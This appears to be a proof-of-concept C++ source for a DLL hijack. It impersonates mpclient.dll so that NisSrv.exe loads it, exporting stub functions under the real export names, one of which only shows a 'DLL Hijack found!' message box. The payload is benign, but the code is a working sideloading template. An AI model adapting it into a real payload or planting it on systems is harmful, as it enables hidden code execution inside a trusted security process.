// NisSrv.exe - mpclient.dll

#include <windows.h>

#pragma comment (lib, "User32.lib")

int Main() {
    MessageBoxW(0, L"DLL Hijack found!", L"DLL Hijack", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void MpConfigClose(){}
extern "C" __declspec(dllexport) void MpConfigGetValueAlloc(){}
extern "C" __declspec(dllexport) void MpHandleClose(){}
extern "C" __declspec(dllexport) void MpNotificationRegister(){}
extern "C" __declspec(dllexport) void MpManagerOpen(){}
extern "C" __declspec(dllexport) void MpFreeMemory(){}
extern "C" __declspec(dllexport) void MpConfigUninitialize(){}
extern "C" __declspec(dllexport) void MpConfigOpen(){}
extern "C" __declspec(dllexport) void MpConfigInitialize(){}
extern "C" __declspec(dllexport) void MpClientUtilExportFunctions(){}
extern "C" __declspec(dllexport) void MpUtilsExportFunctions(){ Main(); }
